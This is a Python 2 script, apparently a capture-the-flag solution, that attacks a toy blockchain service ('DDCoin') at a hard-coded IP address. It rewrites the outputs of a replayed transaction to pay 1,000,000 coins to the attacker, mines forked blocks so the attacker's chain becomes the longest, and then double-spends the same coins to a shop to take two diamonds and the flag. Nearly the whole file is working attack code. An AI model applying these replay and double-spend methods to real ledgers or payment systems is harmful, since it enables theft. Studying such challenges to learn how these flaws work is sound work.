import requests, json, hashlib, rsa

EMPTY_HASH = '0'*64

def pubkey_to_address(pubkey):
	assert pubkey.e == 65537
	hexed = hex(pubkey.n)
	if hexed.endswith('L'): hexed = hexed[:-1]
	if hexed.startswith('0x'): hexed = hexed[2:]
	return hexed

def gen_addr_key_pair():
	pubkey, privkey = rsa.newkeys(384)
	return pubkey_to_address(pubkey), privkey
	
def sign_input_utxo(input_utxo_id, privkey):
	return rsa.sign(input_utxo_id, privkey, 'SHA-1').encode('hex')

def hash(x):
	return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()
	
def hash_reducer(x, y):
	return hash(hash(x)+hash(y))
	
def hash_utxo(utxo):
	return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])
	
def hash_tx(tx):
	return reduce(hash_reducer, [
		reduce(hash_reducer, tx['input'], EMPTY_HASH),
		reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)
	])
	
def hash_block(block):
	return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])

def create_tx(input_utxo_ids, output_utxo, privkey_from=None):
	tx = {'input': input_utxo_ids, 'signature': [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], 'output': output_utxo}
	tx['hash'] = hash_tx(tx)
	return tx
	
# -------------- code copied from server.py END ------------

def create_output_utxo(addr_to, amount):
	utxo = {'id': 'my_recycled_utxo', 'addr': addr_to, 'amount': amount}
	utxo['hash'] = hash_utxo(utxo)
	return utxo
	
def create_block_with_PoW(prev_block_hash, transactions, difficulty, nonce_prefix='nonce-'):
	nonce_str = 0
	while True:
		nonce_str += 1
		nonce = nonce_prefix + str(nonce_str)
		block = {'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions}
		block['hash'] = hash_block(block)
		if int(block['hash'], 16) < difficulty: return block

url_prefix = 'http://116.85.48.107:5000/b942f830cf97e'
s = requests.session()
my_address, my_privkey = gen_addr_key_pair()
print 'my address:', my_address

def append_block(block):
	print '[APPEND]', s.post(url_prefix+'/create_transaction', data=json.dumps(block)).text
	
def show_blockchain():
	print s.get(url_prefix+'/').text.replace('<br />','')

blocks = json.loads(s.get(url_prefix+'/').text.split('Blockchain Explorer: ')[1]).values()
genesis_block = filter(lambda i: i['height'] == 0, blocks)[0]

# replay attack
attacked_block = filter(lambda i: i['height'] == 1, blocks)[0]
replayed_tx = attacked_block['transactions'][0]
replayed_tx['output'] = [create_output_utxo(my_address, 1000000)]
replayed_tx['hash'] = hash_tx(replayed_tx)

DIFFICULTY = int('00000' + 'f' * 59, 16)
forked_block = create_block_with_PoW(genesis_block['hash'], [replayed_tx], DIFFICULTY)
append_block(forked_block)

# generate 2 empty blocks behind to make sure our forked chain is the longest blockchain
prev = forked_block['hash']
for i in xrange(2):
	empty_block = create_block_with_PoW(prev, [], DIFFICULTY)
	prev = empty_block['hash']
	append_block(empty_block)
	
show_blockchain()
print 'replay done. ------------------ '
	
# now we have 1000000 DDCoins, transfer to the shop to buy diamond
shop_address = s.get(url_prefix+'/flag').text.split('1000000 DDCoins to ')[1]
output_to_shop = create_output_utxo(shop_address, 1000000)
utxo_to_double_spend = replayed_tx['output'][0]['id']
tx_to_shop = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
new_block = create_block_with_PoW(prev, [tx_to_shop], DIFFICULTY)
append_block(new_block)

# now we have 1 diamond and 0 DDCoin, we should double spend the "utxo_to_double_spend" by forking the blockchain again
new_block = create_block_with_PoW(prev, [tx_to_shop], DIFFICULTY, 'another-chain-nonce-')
append_block(new_block)
# append another 2 empty blocks to make sure this is the longest blockchain
prev = new_block['hash']
for i in xrange(2):
	empty_block = create_block_with_PoW(prev, [], DIFFICULTY)
	prev = empty_block['hash']
	append_block(empty_block)
# and the shop receive 1000000 DDCoins in this newly-forked blockchain... we have got another diamond

show_blockchain()
print '===================='
print s.get(url_prefix+'/flag').text